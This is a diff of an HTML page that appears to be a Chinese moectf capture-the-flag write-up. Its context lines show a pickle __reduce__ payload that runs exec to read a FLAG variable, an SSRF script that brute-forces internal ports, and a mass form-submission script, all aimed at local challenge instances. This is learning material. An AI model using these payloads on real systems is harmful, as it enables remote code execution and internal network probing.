@@ -821,11 +821,11 @@
 </ul>
 </blockquote>
 <p>结合上面的文章，再看源码中的关于<span class="heti-skip"><span class="heti-spacing"> </span>import<span class="heti-spacing"> </span></span>的代码，有：</p>
-<div class="highlight"><span class="filename">petStore</span><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">base64</span>
-<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kn">import</span> <span class="nn">pickle</span>
+<div class="highlight"><span class="filename">petStore</span><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
 <a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>
-<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="k">class</span> <span class="nc">Test</span><span class="p">:</span>
-<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="k">class</span><span class="w"> </span><span class="nc">Test</span><span class="p">:</span>
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
 <a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="s2">"import os; store.create_pet(os.getenv('FLAG'), 'flag');"</span><span class="p">,))</span>
 <a href="#__codelineno-0-7" id="__codelineno-0-7" name="__codelineno-0-7"></a>
 <a href="#__codelineno-0-8" id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
@@ -1037,7 +1037,7 @@
 <p><a href="https://xz.aliyun.com/t/12163?time__1311=GqGxRDuDgQD%3DqGN4eeqBKwc4jxWw3OTxEbD"><span>flask<span class="heti-spacing"> </span></span>服务器</a></p>
 </blockquote>
 <p>使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>爆破内部端口：</p>
-<div class="highlight"><span class="filename">ImageCloud.py</span><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><span class="filename">ImageCloud.py</span><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 <a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>
 <a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="n">base_url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1:55844/image?url=http://localhost:</span><span class="si">{}</span><span class="s2">/image/flag.jpg"</span>
 <a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a>
@@ -1068,14 +1068,14 @@
 </blockquote>
 <h3 id="proveyourlove">ProveYourLove<a class="headerlink" href="#proveyourlove" title="Permanent link">¶</a></h3>
 <p>根据题目提示，我们需要提交<span class="heti-skip"><span class="heti-spacing"> </span>300<span class="heti-spacing"> </span></span>份；而当我们提交后会被<span class="heti-skip"><span class="heti-spacing"> </span>confessionSubmitted<span class="heti-spacing"> </span></span>检测，故将其修改即可：</p>
-<div class="highlight"><span class="filename">ProveYourLove.py</span><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kn">import</span> <span class="nn">aiohttp</span>
-<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="kn">import</span> <span class="nn">asyncio</span>
-<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="kn">import</span> <span class="nn">json</span>
+<div class="highlight"><span class="filename">ProveYourLove.py</span><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">aiohttp</span>
+<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
+<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
 <a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a>
 <a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1:53419"</span>
 <a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a>
 <a href="#__codelineno-6-7" id="__codelineno-6-7" name="__codelineno-6-7"></a>
-<a href="#__codelineno-6-8" id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="k">async</span> <span class="k">def</span> <span class="nf">submit_forms</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
+<a href="#__codelineno-6-8" id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">submit_forms</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
 <a href="#__codelineno-6-9" id="__codelineno-6-9" name="__codelineno-6-9"></a>    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
 <a href="#__codelineno-6-10" id="__codelineno-6-10" name="__codelineno-6-10"></a>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
 <a href="#__codelineno-6-11" id="__codelineno-6-11" name="__codelineno-6-11"></a>            <span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
@@ -1221,8 +1221,8 @@
 <p>moectf{I5_My_WIfE-P10_CHaN-cute-0r_Y0uR-Wif3-I5_pHP?b2}</p>
 </blockquote>
 <h3 id="_3">勇闯铜人阵<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
-<div class="highlight"><span class="filename">listenToTheVoice</span><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="kn">import</span> <span class="nn">re</span>
-<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><span class="filename">listenToTheVoice</span><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 <a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>
 <a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
 <a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1:53246/"</span>
@@ -1243,7 +1243,7 @@
 <a href="#__codelineno-9-20" id="__codelineno-9-20" name="__codelineno-9-20"></a><span class="p">}</span>
 <a href="#__codelineno-9-21" id="__codelineno-9-21" name="__codelineno-9-21"></a>
 <a href="#__codelineno-9-22" id="__codelineno-9-22" name="__codelineno-9-22"></a>
-<a href="#__codelineno-9-23" id="__codelineno-9-23" name="__codelineno-9-23"></a><span class="k">def</span> <span class="nf">format_directions</span><span class="p">(</span><span class="n">nums</span><span class="p">):</span>
+<a href="#__codelineno-9-23" id="__codelineno-9-23" name="__codelineno-9-23"></a><span class="k">def</span><span class="w"> </span><span class="nf">format_directions</span><span class="p">(</span><span class="n">nums</span><span class="p">):</span>
 <a href="#__codelineno-9-24" id="__codelineno-9-24" name="__codelineno-9-24"></a>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
 <a href="#__codelineno-9-25" id="__codelineno-9-25" name="__codelineno-9-25"></a>        <span class="c1"># 列表中只有一个数字，直接返回方向名称</span>
 <a href="#__codelineno-9-26" id="__codelineno-9-26" name="__codelineno-9-26"></a>        <span class="n">direction</span> <span class="o">=</span> <span class="n">directions_map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">nums</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s2">"??"</span><span class="p">)</span>
